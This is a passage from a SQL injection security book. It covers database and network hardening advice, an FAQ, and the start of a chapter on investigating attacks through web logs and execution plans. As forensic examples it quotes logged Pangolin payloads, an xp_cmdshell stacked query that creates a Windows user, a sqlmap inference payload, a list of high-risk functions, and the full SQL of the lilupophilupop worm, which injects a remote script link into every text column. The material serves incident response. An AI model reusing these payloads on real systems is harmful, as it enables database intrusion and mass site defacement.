file, but provides potential security benefits with insight into cookie and referer headers, which are another potential location for sql injection vulnerabilities to materialize. both apache and iis require the installation of additional modules to log post data. refer to “using runtime protection” for techniques and solutions to add monitoring and intrusion detection facilities to your web application. deploy the web and database servers on separate hosts you should avoid running the web and database server software on the same host. this significantly increases the attack surface of the web applicati on and may expose the database server software to attacks that previously were not possible given access to the web front end only. for example, the oracle xml database (xdb) exposes an http server service on transmission control protocol (tcp) port 8080. this is now an additional entry point for probing and potential injection. additionally, the attacker could leverage this deployment scenario to write query results to a file in a web -accessible directory and view the results in the web browser. configure network access control in networks that are properly layered, database servers are typically located on internal trusted networks. usually this segregation is beneficial to thwart network- based attacks; however, this trusted network can be breach ed via a sql injection vulnerability in an internet -facing web site. with direct access to the database server, the attacker can attempt to connect to other systems on the same network. most database server platforms offer one or more ways for initiating n etwork connections. given this, consider implementing network access controls to restrict connections to other systems on the internal network. you can do this at the network layer with firewall and router acls or by using a host -level mechanism such as ip sec. additionally, ensure that proper network access controls are in place to prevent outbound network connections as these can be leveraged by attackers to tunnel database results out of the network via an alternative protocol such as dns or the database server’s own network protocol. summary platform security is an important part of the overall security architecture of any web application. you can deploy runtime protection techniques, such as web server and application -level plug -ins, without modifying ap plication code to detect, prevent, or mitigate sql injection. the best runtime solution will depend on the technologies and platforms that make up the application environment. you can harden database servers to significantly mitigate the scope of compromis e (i.e. application, server, and/or network compromise) and unauthorized data access. in addition, you can leverage network architectural changes and a secured web infrastructure configuration to mitigate and lessen the chances of detection. it is importan t to remember that platform security is not a substitute for addressing the real problem: the insecure coding patterns that cause sql injection in the first place. a hardened network and application infrastructure combined with runtime monitoring and tuned prevention provide a formidable defense to thwart the sql injection vulnerabilities that may be present in the code. platform -level security is an important component to the overall security strategy for both existing and new applications. solutions fast track using runtime protection • runtime protection is an effective technique for addressing sql injection when code changes are not possible. • web application firewalls can provide effective detection, mitigation, and prevention of sql injection when properly tuned. • runtime protection spans multiple layers and tiers, including the network, web server, application framework, and database server. securing the database • hardening the database will not stop sql injection, but can significantly reduce the i mpact. • attackers should be sandboxed to application data only. in a locked- down database server, compromise of other databases and systems on connected networks should not be possible. • access should be restricted to only required database objects, such as execute permissions on stored procedures only. in addition, judicious use of strong cryptography on sensitive data can prevent unauthorized data access. additional deployment considerations • a hardened web -tier deployment and network architecture will not stop sql injection, but can significantly reduce its impact. • when faced with the threat of automated attackers, such as sql injection worms, minimizing information leakage at the network, web, and application layers will help lessen the chances of d iscovery. • a properly architected network should only allow authorized connections to the database server, and the database server itself should not be permitted to make outbound connections. frequently asked questions q: when is the use of runtime protec tion appropriate? a: runtime protection can help mitigate or even patch known vulnerabilities, as well as provide a first line of defense against unknown threats. when code changes are not possible in the near term, you should use runtime protection. addit ionally, the detection capabilities of certain runtime solutions make it ideal for use on every production web application. when configured in logging mode, runtime protection provides an excellent application intrusion detection system and can generate au dit logs for forensic analysis if necessary. q: we just deployed a web application firewall (waf), so we’re safe, right? a: no. do not expect to deploy a waf, flip the switch, and receive instant protection. wafs out-of-the-box are most effective for detecting attacks and applying virtual patches to specific vulnerable web pages or urls. be careful of blocking traffic until the waf has been through a learning phase and has been highly tuned. q: modsecurity is great, but we don’t run apache in our environment. what are some free alternatives for microsoft iis? a: urlscan and webknight are both free isapi filters that you can plug into iis with minimal effort. webknight is a better choice if you are concerned about protecting post data from sql injection attac ks. you can also look into using asp.net httpmodules, which you can use with additional web server configuration to protect virtually any web application capable of running on iis. look into secure parameter filter and keep an eye on module developers now that iis 7.0 and up support managed code in the iis request/response handling pipeline. q: why can my application database login view certain system objects? what can i do to prevent this? a: this occurs because virtually every database platform comes with a default role that all logins are mapped to. this role, usually called the public role, has a set of default permissions which often include access to many system objects, including some adm inistrative stored procedures and functions. at a minimum, revoke any permissions that the public role may have in your application database. wherever possible, revoke public permissions from databasewide system objects. a database audit of public role per missions is a good starting point to determine the potential exposure and corrective action that can be taken to lock it down. q: should we store passwords encrypted, or a hash of the password in the database? a: it’s usually best not to store anything sensitive if you don’t have to. when it comes to passwords, storing a hash of the password is preferable over storing the password encrypted. this alleviates key management issues associated with encryption and forces an attacker to brute -force hashes should access to the passwords be obtained. ensure that each password is salted with a unique value to prevent compromise of identical accounts should a hash actually be cracked. lastly, use industry -approved cryptographically secure hashing algorithms only, such as one of the sha -2 family (sha256, sha384, sha512) or for even more secure hashes, an algorithm specifically designed for hashing passwords such as bcrypt or scrypt. q: our application has very little logging capabilities and we’d like a little more insight into potential sql injection attacks. how can we add this into our environment without changing the application? a: there are a number of steps you can take. rather than adding modules to your application from the start, you may want to begin with the web server log files. all web servers keep a log of requests and response status codes by default. you can usually customize them to capture additional data, although you’ll still be missing some insight into post data as this is not logged. web application firewalls can be a nice supplement, as they usually support the ability to log entire request and response transactions. additionally, there are a number of freely available logging modules that you can deploy with your application and that require only a configuration change. q: are there ways to hide my web site from attackers, but at the same time still make my site easily accessible to my customers? a: a determined attacker will always find your web site; however, there are some basic things you can do to at least minimize detection by automated scanners and worms. set up your web server so that the default web site returns a blank page, use a wildcard ssl certificate, and configure reverse dns lookups so that the web server ip address does not resolve to a host name configured on the web server. if you are really paranoid, request that your site be removed from the index of popular search engines, such as google. q: i have a thick client application that needs to be hardened against sql injection. what can i do without changing any code? a: if it talks to an application server over http, many of the same runtime solutions used for web applications also apply to thick client applications. web services should be hardened so that the web services descripti on language (wsdl) file is returned when requested. if the application performs data access, all of the normal database lockdown procedures apply. if the client connects directly to the database, consider the use of a database firewall. in this scenario, you will need to configure network access controls so that the database firewall cannot be bypassed. chapter 10 confirming and recovering from sql injection attacks kevvie fowler solutions in this chapter: • investigating a suspected sql injection attack • so, you’re a victim —now what? introduction sql injection is the attack of choice for hackers and is used in many of the information security breaches that continue to create headlines week after week. these breaches often cause devastating damage to an org anization’s reputation and carry financial penalties and loss of business which can force a firm out of business. with businesses facing these consequences they often task information security professionals with proactively detecting and leading the remedi ation of sql injection vulnerabilities within their applications. in many organizations new sql injection vulnerabilities seem to be introduced before the known ones can be fixed. whether it is the result of ignoring security testing in the rush to push ne w applications into production or lack of security integration into the software development life cycle, many organizations have sql injection exposures that serve as key targets for hackers. inevitably, hackers will find and exploit these vulnerabilities and sql injection- related incidents will be brought to the attention of incident response teams and forensics professionals to review, validate, and respond to. in this chapter we will walk you through the steps required to confirm or discount a successful sql injection attack and help you to understand what you can to do to minimize business impact by effectively containing or recovering from an attack. investigating a suspected sql injection attack in chapter 2 we looked at how to test for sql injection vulnerabilities within applications and how to confirm identified vulnerabilities. these techniques are straight forward when a security professional (or attacker) is on the other end of a web browser receiving the responses to sql injection tests in near real- time. investigators have a much more difficult job of sifting through a deluge of information after a suspected attack has occurred to determine not only if there is evidence of an attempted sql injection att ack but also if the attack was successful. the steps we are about to walk through are intended for computer security incident responders and forensics professionals authorized to perform investigations within an organization. other readers can practice these steps in academic settings or follow along as general awareness. following forensically sound practices despite the growth in and awareness of the field of computer forensics experienced over the past 10 years there are still countless investigations that involve evidence that could not be admitted to legal proceedings due to improper collection, handling, or management by unqualified individuals. in most jurisdictions there are strict rules and guidelines governing how digital evidence must be gathered and managed if it is to be admissible in a court of law. common requirements include: 1. individuals traine d in computer forensics and authorized to perform digital investigations within an organization should handle investigations. 2. all files gathered during an investigation should be imaged and a duplicate image should be created for analysis. this ensures there is always an original image available if needed. 3. a hash should be generated on each newly created file image as well as one on the source file. for example, if gathering a web server log file, the log file on the server would be imaged and a hash would be created on the original source file as well as the new image (copy) you just created to ensure they match and the file was copied correctly without corruption. a specialist tool such as dcfldd should be used to image as it is reliable, flexible and will automatically generate hashes on both the original and newly created image. the following syntax is an example that will image the c:\\ logs\\postgresql.log file to z: \\ and generate sha1 hashes on both to ensure they match, storing the hashes within the z:\\postgresql.sha1 file: dcfldd if=“c: \\logs\\postgresql.log” of=z:\\postgresql.dcfldd hash=sha1 hashlog=z:\\ postgresql.sha1 4. document all actions you perform during your investigation, including those completed when connected to the database server: • keep a record of the time of your connection and the user context that was used. • keep a record of the commands you executed within the rdbms. • pipe all results to a text file. there are multiple methods you can use to redirect stdout from your database cli ent console to a text file. table 10.1 contains a listing of stdout redirection commands for popular rdbms clients. table 10.1 stdout redirection commands for popular rdbms clients 5. ensure all evidence is written to sterile storage media and stored in a secure location such as a locker/safe. 6. maintain a chain of custod y documents which tracks the movement, location, and ownership of all gathered evidence from the time it is preserved up until it is presented within a court of law. during an investigation you can’t disregard these guidelines and then, once you’ve confirm ed a successful sql injection attack has occurred, roll back the hands of time and redo your analysis this time following proper court approved methods. it can’t be emphasized enough that in order to ensure you don’t invalidate any possible future case you may have it’s imperative the above guidelines are adhered to from the onset of any investigation—even before you verify if an attack has been successful or whether or not future legal action is planned. with an understanding of how to manage the evidence you gather during your investigation let us jump into the actual artifacts that will contain the information you’ll need in order to confirm or discount a successful sql injection attack. analyzing digital artifacts digital artifacts are collections of related data. they range from web server log files stored within the operating system’s file system to information stored in memory or within the internals of a rdbms. there are dozens of database artifacts. in this chapter the focus will be on a few of the a rtifacts most beneficial when investigating a sql injection attack —web server logs, database execution plans, the transaction log, and database object timestamps. though most of these artifacts exist across microsoft sql server, oracle, mysql, and postgres ql rdbms products, the scope of information within and the method used to access it will vary. we’ll step through each of these artifacts beginning with web server log files which are the single most important artifact you’ll need to investigate a potentia l breach. web server log files web servers are core components of web -based applications and serve as the interaction layer receiving user input and passing it to back- end applications. web servers usually maintain a persistent log file that contains a his torical record of the page request it received and the outcome of the request in the form of a status code. the amount of information logged is customizable by a system administrator, however major web server products such as microsoft iis and apache have logging of basic information enabled by default. web server logging attributes most beneficial in a sql injection investigation are captured in table 10.2. table 10.2 web server log attributes most beneficial in a sql injection investigation log field name description primary investigative valu e date date of activity establish a timeline of events and to correlate log field name description primary investigative valu e events across artifacts time time of activity establish a timeline of events and to correlate events across artifacts client- ip address (c -ip) ip address of the requesting client identify source of web requests cs-username name of the authenticated user making the request identify user context associated with traffic cs-method requested action http action the client was attempting to perform cs-uri-stem request target (i.e. requested web page) the resources (pages, executables, etc.) accessed by the client cs-uri-query query requested by the client identify malicious queries submitted by the client sc-status status code of client request identify the outcome (status) of processing the client request cs(user -agent) version of browser used by the client tracing requests back to specific clients who may be using multiply ip addresses cs-bytes bytes sent from client to server identify abnormal traffic transmissions sc-bytes bytes sent from server to client identify abnormal traffic transmissions log field name description primary investigative valu e time taken (time -taken) server milliseconds taken to executes the request identify instances of abnormal request processing this information holds critical information about both legitimate and malicious acc ess attempts, such as those generated in response to a sql injection attack, and will be critical when analyzing log file data. by default web servers persistently store log data in text files within the file system of the operating system. web server logs can range in size from a few megabytes to multi -gigabyte files. due to the sheer volume of data within large web server log files, it’s far more efficient to use a log analyzer instead of manually reviewing contents for attacks. log parser is a tool devel oped by microsoft that is vendor neutral, supports log file formats used by iis and apache and allows you to use the flexibility, speed, and precision of sql to analyze huge log files in a very time efficient manner. when you begin an investigation, you wi ll typically have few details about the suspected sql injection attack and will need to perform a broad analysis of the web log file. a good place to start is looking for dates with an abnormally high numbers of web requests or bandwidth usage. the followi ng are examples of how to do both using log parser: bandwidth utilization by day: the following example analyzes iis log files and returns the amount of kilobytes transferred to and from the webserver each day. note for the following query the cs -bytes and sc-bytes fields (which are not enabled by default) must be enabled: logparser “select to_string(to_timestamp(date, time), ‘mm- dd’) as day, div(sum(csbytes),1024) as incoming(k), div(sum(sc -bytes),1024) as outgoing(k) into z:\\bandwidth_by_day.txt from c:\\ inetpub\\ logs\\logfiles\\ w3svc2\\u_ex∗.log group by day” sample results are as follows: day incoming(k) outgoing(k) ----- ----------- ----------- ... 07-21 800 94 07-30 500 101 01-10 300 100 01-27 1059 2398 01-28 1106 2775 ... number of page hits per day: the following query will return the number of times each asp page and executable file was requested, grouped by date: logparser “select to_string(to_timestamp(date, time), ‘yyyy- mm-dd’) as day, cs- uri-stem, count(∗) as total from c:\\ inetpub\\logs\\logfiles \\w3svc1\\u_ex∗.log where (sc- status<400 or sc-status>=500) and (to_lowercase(cs- uri-stem) like ‘%.asp%’ or to_lowercase(cs- uri-stem) like ‘%.exe%’) group by day, cs- uri-stem order by cs- uri-stem, day ” -rtp:-1 although some pages in a website will be accessed more than others you should review the results to identify pages and objects with an unusually high number of hits when compared to hits of other days. the following results show a spike in the number of hits december 8th, which should be investigated furt her: day cs-uri-stem total ---------- -------------- ----- ... 2011-05-15 /defalut.aspx 123 2011-03-31 /default.aspx 119 2011-12-07 /default.aspx 163 2011-12-08 /default.aspx 2109 2011-12-09 /default.aspx 204 ... number of page hits per day, by ip: digging dow n a little deeper the following query can be used to return a listing of recorded ip’s and the resources they access per day which should be reviewed focusing in on specific ip address and hit combinations with a high hit count: logparser “select distinct date, cs- uri-stem, c- ip, count(∗ ) as hits from c:\\inetpub\\logs\\logfiles \\w3svc1\\u_ex∗.log group by date, c- ip, cs-uri-stem having hits> 40 order by hits desc ” -rtp:-1 date cs- uri-stem c-ip hits ---------- -------------------- ------------ ---- ... 2010-11-21 /employeesearch.aspx 192.168.1.31 902 2011-03-19 /employeesearch.aspx 192.168.1.8 69 2011-03-21 /employeesearch.aspx 192.168.1.8 44 2010-11-21 /employeesearch.aspx 192.168.1.65 41 2011-12-08 /employeesearch.aspx 192.168.1.8 1007 2011-03-19 /employeesearch.aspx 192.168.1.50 95 2011-05-15 /employeesearch.aspx 192.168.1.99 68 2011-03-21 /employeesearch.aspx 192.168.1.50 59 ... note that sql injection vulnerabilities are often exploited by the same attacker over multiple dates. during this timeframe, the same attacker may connect from different physical locations or bounce off different proxies in order to change his associated ip address. to help identify this you should compare the client information stored within the c -ip attribute ac ross multiple ip’s with high hit counts to see if there is a match, indicating it may be the same client at the other end of the connection. the following query can be run that will analyze web logs and compare client information such as operating system, local version of .net, and patch level against two supplied ip addresses: logparser “select distinct c- ip, cs(user -agent) from ex030622.log where c- ip=‘198.54.202.2’ or c-ip=‘62.135.71.223’” -rtp:-1 you should look for similar client versions and software within the results as in the following example: ... 192.168.6.51 mozilla/4.0+(compatible;+msie+8.0;+windows+nt+6.1;+w... 192.168.6.131 mozilla/4.0+(compatible;+msie+8.0;+windows+nt+6.1;+... ... there is some room for error with the above as it is theoretically pos sible for two different machines to have matching operating system versions, client software, and patches. you can further your analysis by comparing the web requests between the two suspected clients to further determine if it is likely the same machine c onnecting from different ip addresses. at this point you should have an understanding of the web pages or executable targeted by attackers as well as the timeframe during which the attack is thought to have occurred. this information can be used to zero in on malicious activity by looking for malicious query parameters and a technique i like to call spear -searching. malicious query parameters: the following is an example of a query that will return a listing of all query parameters submitted to a web applic ation, the source ip address, and the number of times the parameter was sent: logparser -rtp:-1 -o:w3c “select cs- uri-query, count(∗ ) as [requests], c- ip into z:\\query_parameters.log from c:\\ inetpub\\ logs\\logfiles\\ w3svc1\\u_ex∗.log where cs- uri-query is not null group by cs -uri-query, c- ip order by cs- uri-query” the following is a fragment of the preceding query’s result, which shows a variety of query parameters containing malicious sql injection syntax: ... name=mikaela 1 192.168.6.121 name=isaiah 1 192.168.6 .121 name=corynn 1 192.168.6.121 name=lory 1 192.168.6.136 name=jarrell 1 192.168.6.136 name=mekhi 3 192.168.0.111 name=elijah 2 192.168.1.65 name=emerson 1 192.168.6.136 name=ronan 1 192.168.6.136 name=mikaela’%20;create%20table%20[pangolin_test_table]([a]%20nva... name=mikaela’%20;create%20table%20[pangolin_test_table]([resulttx... name=mikaela’%20;create%20table%20pangolin_test_table(name%20nvar... name=mikaela’%20;create%20table%20pangolin_test_table(name%20nvar... name=mikaela’%20;declare%20@s%20nvarchar(4000)%20exec%20master.db... name=mikaela’%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x43003... name=mikaela’%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x61007... name=mikaela’%20;drop%20table%20[pangolin_test_table]; -- 2 192.16... name=mikaela’%20;drop%20table%20pangolin_test_table;-- 6 192.168.... name=mikaela’%20;drop%20table%20pangolin_test_table;create%20tabl... name=mikaela’%20;drop%20table%20pangolin_test_table;create%20tabl... name=mikaela’%20;exec%20sp_configure%200x41006400200048006f006300... name=mikaela’%20;exec%20sp_configure%200x730068006f00770020006100... name=mikaela’%20;insert%20pangolin_test_table%20exec%20master.dbo... name=mikaela’%20;insert%20pangolin_test_table%20exec%20master.dbo... name=mikaela’%20and%20(select%20cast(count(1)%20as%20varchar(8000... name=mikaela’%20and%20(select%20cast(count(1)%20as%20varchar(8000... ... spear -searching: allows you to specifically look for evidence of known malicious act ivity. the next query searches all webserver log files for the keyword “pangolin”: logparser -i:iisw3c “select date,time,cs- uri-stem,cs-uri-query from c:\\inetpub\\logs\\logfiles \\w3svc1\\u_∗.∗ where cs- uri-query like ‘ %pangolin% ’” -o:csv results similar to the following are returned which show several malicious queries launched by the pangolin sql injection exploitation tool: date,time,cs- uri-stem,cs-uri-query 2010-11-21,12:57:42,/employeesearch.aspx,name=tempdb’%20;drop%20table%20pan... 2010-11-21,12:57:42,/employeesearch.aspx,“name=tempdb’%20;create%20table%20... 2010-11-21,12:57:48,/employeesearch.aspx,name=tempdb’%20;insert%20pangolin_... 2010-11-21,12:57:48,/employeesearch.aspx,“name=tempdb’%20and%200%3c(select%... 2010-11-21,12:57:48,/employeesearch.aspx,“name=tempdb’%20and%200%3c(select%... 2010-11-21,12:57:48,/employeesearch.aspx,name=tempdb’%20;drop%20table%20pan... 2010-11-21,12:57:48,/employeesearch.aspx,name=tempdb’%20;drop%20table%20pan... 2010-11-21,12:57:48,/employeesearch.aspx,“name=tempdb’%20;create%20table%20... 2010-11-21,12:57:48,/employeesearch.aspx,name=tempdb’%20;insert%20pangolin_... 2010-11-21,12:57:48,/employeesearch.aspx,“name=tempdb’%20and%200%3c(select%... 2010-11-21,12:57:48,/employeesearch.aspx,“name=tempdb’%20and%200%3c(select%... 2010-11-21,12:57:48,/employeesearch.aspx,name=tempdb’%20;drop%20table%20pan... 2010-11-21,13:01:22,/employeesearch.aspx,name=tempdb’%20;drop%20table%20pan... 2010-11-21,13:01:22,/employeesearch.aspx,“name=tempdb’%20;create%20table%20... the last query we will lo ok at to detect sql injection attacks within web server logs are ip addresses that received an unusually high amount of data from a web server. during a sql injection attack an attacker will often send a high amount of traffic to the server as he attempts to locate and exploit a sql injection vulnerability. this activity typically generates http responses and general server errors. the payload of many sql injection attacks is the transfer of information from a vulnerable webserver to an attacker’s computer. searching web server logs for ip addresses in receipt of large data transfers from the webserver can lead you to evidence of a successful sql injection attack. the following query will return the number of kilobytes sent from a webserver to a client group ed by ip address: logparser “select cs- uri-stem, count(∗ ) as hits, avg(sc- bytes) as avg, max(sc- bytes) as max, min(sc-bytes) as min, sum(sc- bytes) as total from c:\\inetpub\\logs\\logfiles \\w3svc1\\u_ex∗.log where to_lowercase(cs- uri-stem) like ‘%.asp%’ or to_lowercase(cs- uri-stem) like ‘%.exe%’ group by cs- uri-stem order by cs -uri-stem” -rtp:-1 >> z:\\srv_to_client_transfer.txt sample results are as follows: cs-uri-stem hits avg max min total ------------------------------ ---- ---- ---- ---- ------ ... /employees earch.asp 2 - - - - employeesearch.aspx 2764 2113 3635 1350 16908 /employeesearch.aspx/ 193 3352 3734 1321 647008 /rzsqli/employeesearch.aspx 1 - - - - ... to take the analysis a step further you can correlate ip’s in receipt of high byte counts with those who supplied malicious queries within query name parameters. at this point you should have identified web pages and executable files within the application that were attacked, the timeframe of the attack and the ip addresses for the source. this information will help you focus your analysis of other database artifacts to help confirm if attempted attacks were successful. the second artifact we will look at are database execution plans which are a valuable method of confirming or discounting a sql injection attack. database execution plans a database execution plan is a generated list of steps that show an rdbms the most efficient way to access or modify infor mation. an example of this is if you were to look up directions to a street address. there are multiple routes you could take to get to your destination such as using highways or city streets with one route being the quickest. looking at that analogy within the database the data to be retrieved or updated would be the destination address and the most efficient route would be using indexes (high- ways), city streets (manually scanning all data pages looking for specific data) or a combination of both. a datab ase uses execution plans to ensure it is processing and satisfying queries in the most efficient manner possible. the first time a query is sent to a database server it will be parsed, analyzed to determine which tables would need to be accessed, which ind exes (if any) to use, how to join or merge the results and so on. the outcome of this analysis is stored in a structure referred to as a database execution plan. these plans are shared between internal database components during execution and stored in an area of memory referred to as a plan cache with the hopes that it can be reused when another similar query is received. in addition to the most efficient way to satisfy a query, execution plans contain the syntax of the actual query that forced its creatio n. this information is critical during an investigation as execution plans can provide the exact syntax of previously executed sql statements, including malicious queries stemming from a sql injection attack. some rdbms products maintain several caches for different types of sql, but for simplicity we will focus on just the caches holding ad hoc queries and those stemming from sql objects such as stored procedures, triggers, and extended procedures. tools and traps caching can be beneficial for investigatin g potential sql injection attacks however caching of sensitive information such as system passwords poses a security risk. the information you gather during an investigation may contain passwords for administrator level database accounts which you will need to treat confidentially. recent version of microsoft sql server and oracle rdbms platforms do have internal mechanisms that prevent exposing sensitive system passwords within execution plans, however older versions do not. for example prior to microsoft sql server 2005, sensitive information such as passwords used in conjunction with the sp_password and openrowset commands were often stored and exposed to other users within the execution plan cache. mysql and postgresql do not contain protection for caching of sensitive information and can log sensitive information within additional files such as the general and binary log files. all information gathered during your investigation should be treated as confidential. analyzing a copy of executed queries may seem like a repeat of analyz ing web server log files however keep in mind that sql injection queries you find in a web server log indicate an attack was attempted and logged—not that it was successful . controls such as protection within the code on the database server and down- stream security devices such as host and network ips systems between the web server and database server may have detected and blocked the attack. further there’s no guarantee the malicious code was successfully received and processed by the database server. look ing at database execution plans eliminates this guesswork as observed malicious sql injection queries indicate the attack was successfully tunneled through an application vulnerability through the network, then received and processed by the database server . further it provides you the actual syntax that would have been received by the database, including the code terminated by the attacker within his attack. this data is omitted within web server and firewall logs. the following is an example of a malicious sql injection query taken from a microsoft sql server execution plan: select employeeid, fname from ssfa.employee where fname= ‘isaiah’; exec xp_cmdshell “net user isaiah chuck!3s /add” -- and companyid = 1967’ you’ll note that the execution plan contains the original sql query and the malicious stacked statement which escapes from the database into the windows operating system and creates a new windows user account. one powerful benefit of execution plan analysis is that the database server will actually cache the entire batch including the post -terminator logic that was commented out to avoid processing by the rdbms. the fact that seemingly valid logic is commented out and an unrelated stacked query was executed is a good indicator of a successful sql inj ection attack. when investigating automated sql injection worms execution plans take on an additional benefit. when the worm is injected via a sql injection vulnerability, it is common for the worm to search database tables for columns suitable to hold its payload. when a suitable column is found it updates the column with the malicious code. behind the scenes, execution plans will be created in response to the initial worm infection as well as for each column updated by the worm as it persistently stores i t’s payload. to illustrate this point let us look at the lilupophilupop sql injection worm which was released in november 2011. the initial infection was captured within the following execution plan taken from an infected microsoft sql server: set ansi_war nings off declare @t varchar(255),@c varchar(255) declare table_cursor cursor for select c.table_name,c.column_name from information_schema.columns c, information_schema.tables t where c.data_type in (‘nvarchar’,‘varchar’,‘ntext’,‘text’) and c.character_ma ximum_length>30 and t.table_name=c.table_name and t.table_type=‘base table’ open table_cursor fetch next from table_cursor into @t,@c while(@@fetch_status=0) begin exec(‘update [’+@t+’] set [’+@c+’]=’’”></title><script src=“http://lilupophilupop.com/sl.php”></script><!-- ’’+rtrim(convert(varchar(6000),[’+@c+’])) where left(rtrim(convert(varchar(6000),[’+@c+’])),17)<>’’”></title><script’’ ’) fetch next from table_cursor into @t,@c end close table_cursor deallocate table_cursor the following snippet was taken from an execution plan on the infected server and shows the worm persistently storing its payload by updating the lname column of the customers table with the malicious link to http://lilupophilupop.com: : update [ employee4] set [lname]=’”></title><script src=“http://lilupophilupop.com/sl.php”></script><!-- ‘+rtrim(convert(varchar(6000),[lname])) where left(rtrim(convert(varchar(6000),[lname])),17)<>’”></title><script’ this information is critical when planning your recovery from an attack as it tells you the exact actions performed by the worm. we’ll discuss this in more detail later in this chapter, for now we’ll take a look at other activity you can look for that would indicate a successful sql injection attack. what to look for within cached execution plans throughout this book we have reviewed multiple techniques used to confirm and exploit sql injection vulnerabilities. the examples and tools provided are current and mirror what attackers will use to exploit and we will look at a few of the common signs of these attacks you can observe within execution plans. however, for a detailed review of the different methods of sql injection attacks you should refer to prior chapters of this book, paying close attention to chapter 4 —exploiting sql injection and chapter 5 —blind sql injection exploitation. the type of sql injection exploitation and attack tool used, if applicable, will leave different traces within execution plans and ultimately determine if you’re looking for a needle in a haystack or a needle in a pin cushion. a sql injection attack using a stacked query can leave a single execution plan whereas a blind sql injection using inference can generate hundreds of execution plans and will stand out like a sore thumb within the execution plan cache. as an example, the sqlmap tool —discussed earlier in this book—is configured to use blind sql injection and inference. this tool will generate over 1300 execution plans such as the following while just enumerating the banner of a microsoft sql server: <injection point> „ and ascii(substring((isnull(cast(@@version as varchar(8000)), char(32))), 171, 1)) > 99 and ‘lyatf’=‘lyatf„ --’ some additional gui dance on what to look for in execution plans are as follows: remnants of known malicious attack activity: sql injection tools and application vulnerability scanners leave behind unique footprints within a database server cache. this book serves as a good r esource of the popular sql injection tools within the industry. you should experiment with these tools and develop a cheat sheet of known attack patterns for your investigations. the following is an example of a sql injection attack launched by the pangoli n attack tool, which exploited a sql injection vulnerability, escaped from the database, and began enumerating the operating system file directory structure: select employeeid, fname, lname, yob from ssfa.employee where [fname]= ‘mikaela’; declare @z nvarchar(4000) set @z=0x43003a005c005c0069006e0065007400700075006200 insert pangolin_test_table execute master..xp_dirtree @z,1,1-- ’ in the preceding execution plan if the use of the table name pangolin_test_table wasn’t a sure indicator of a successful sql inj ection attack via the pangolin exploitation tool, the syntax and structure of the execution plan contents match the pattern left by pangolin. also of interest is that pangolin uses hex encoding in an effort to obfuscate its attack payloads. converting the hex to character makes the payload human readable and in this example provides the specific directory folder the attacker viewed via the xp_dirtree extended procedure. the following is an example of how to perform this conversion using the native convert c ommand of a sql server 2008 server: select convert (nvarchar (max), 0x43003a005c005c0069006e0065007400700075006200) when executed the c: \\\\inetpub value is returned, which is the specific directory enumerated by the attacker. tools and traps note that attackers may use hex encoding in an effort to avoid detection. the hex encoded attack syntax will be entered into the attacker’s web browser and travel encoded over the network to the web server, through to the database server, and it will actually be cached in its encoded format within the execution plan. you’ll need to ensure when searching the plan cache for key strings that you search for both ascii characters as well as other formats such as hex. for a list of obfuscation formats to keep in mind see the evading input filters section within chapter 7 of this book. stacked queries in conjunction with comments: stacked queries are used for both legitimate as well as malicious purposes. several sql batches within procedures shipped by the rdbms vendor and by legitimate database administrators utilize them, therefore the mere existence of a stacked query is not a g ood indication of a successful attack. as we discussed in chapter 4 , insecure handling of user input when building sql queries in most development languages and database platforms is extremely dangerous as this allows manipulation of the sql syntax executed and will allow an attacker to simply stack a new statement on to the existing one where the platform allows. by doing so the attacker will also generally need to comment out the preceding logic the developer intended the application to execute, so looking through execution plans for entries containing stacked queries in addition to terminated logic is a far better indicator of a successful sql injection attack, as witnessed in the following revisited example from earl ier in this chapter: select employeeid, fname from ssfa.employee where fname= ‘lory’; exec xp_cmdshell “net user isaiah chuck!3s /add” -- and id = 1967’ illogical usage of conditional statements: we looked at the usage of conditional operators such as wher e 1=1 or a=a in chapter 4 . the following is an execution plan containing a conditional operator that would indicate a successful attack: select fname, lname, date_of_birth, corp_credit_card_num from employee where empl oyeeid = 1969 or 1 = 1 as you can see within the preceding execution plan there is no logical purpose for the comparison operation 1=1 other than to negate the restriction the programmer intended to enforce via the where expression. high risk statements an d database functions: functionality within rdbms systems was developed by the vendor with the hopes they would simplify many tasks for normal users. over the years hackers have found ways to leverage them to craft their exploits. evidence of the usage of s ome of these features can serve as a good indication of a successful attack depending on their context of use. many of these features have been covered in the previous chapters of this book however table 10.3 is a bri ef summary of high risk functions that are commonly associated with sql injection attacks. table 10.3 high risk statements and functions database functio n microsoft sql server xp_cmdshell xp_reg∗ sp_oacreate sp_oamethod database functio n openrowset sp_configure bulk insert bcp waitfor delay oracle utl_file utl_http httpuritype utl_inaddr mysql load data infile, load_file benchmark encode() outfile() concat() database functio n postgresql pg_ls_dir pg_read_file pg_read_binary_file pg_stat_file pg_sleep it should be noted though that you may find statements utilizing the functions within table 10.3. in many cases you’ll be able to look at the database statements and determine if they are indeed evidence of a past attack. in some cases you will need to flag suspicious activity and present it to the company’s dba or application developer to determine if the usage is part of expected application functionality. now that you know what to look for within execution plans let us move on to the methods you can use to access execution plans on some popular rdbms’s. how to access execution plans microsoft sql server and oracle have different system functions and procedures that allow interaction with execution plans. mysql and postgresql do not allow direct access to stored execution plans. table 10.4 lists d atabase views that can be used to gather cached execution plans. table 10.4 rdbms database views providing access to stored execution plans the following are some examples of how to use the views captured in table 10.4 to access cached execution plans. microsoft sql server the two views that can be used to access the execu tion plan cache are sys.dm_exec_query_stats, which provides execution information, and sys.dm_exec_sql_text, which provides the actual syntax that was executed. the following query uses the views to return the date and time the plan cache entry was created , the last time it was executed (in the case of repeat execution), the syntax executed as well as the number of times the execution plan was reused (see figure 10.1): select creation_time, last_execution_time, text, execution_count from sys.dm_exec_query_stats qs cross apply sys.dm_exec_sql_text(qs.sql_handle) figure 10.1 sample query results containing microsoft sql server execution plans oracle on oracle the gv$sql view can be used to return exe cution plans. please note that gv$sql is a global view that gathers execution plans from both server caches when run on an oracle cluster, but can still be executed to gather the full cache of a standalone oracle installation. due to this, the global view is a better choice than the v$sql view which will provide limited results when run on an oracle cluster. the following is an example of how to use the gv$sql view: select sql_text from gv$sql; sample results are as follows: ... select inst_id,kmmsinam,kmmsip rp,kmmsista,kmmsinmg, kmm... update mgmt_targets set last_load_time=:b2 where target... update mgmt_targets set last_load_time=:b2 where target... update mgmt_targets set last_load_time=:b2 where target... update mgmt_targets set last_load_time=:b2 where target... update mgmt_targets set last_load_time=:b2 where target... update mgmt_targets set last_load_time=:b2 where target... select rowid from emdw_trace_data where log_timestamp <... select /∗ + no_parallel_index(t, “ wrm$_sch_votes_pk” ) ... select /∗ + no_parallel_index(t, “ wrm$_sch_votes_pk” ) ... ... mysql mysql generates and stores execution plans, however there are no vendor -issued 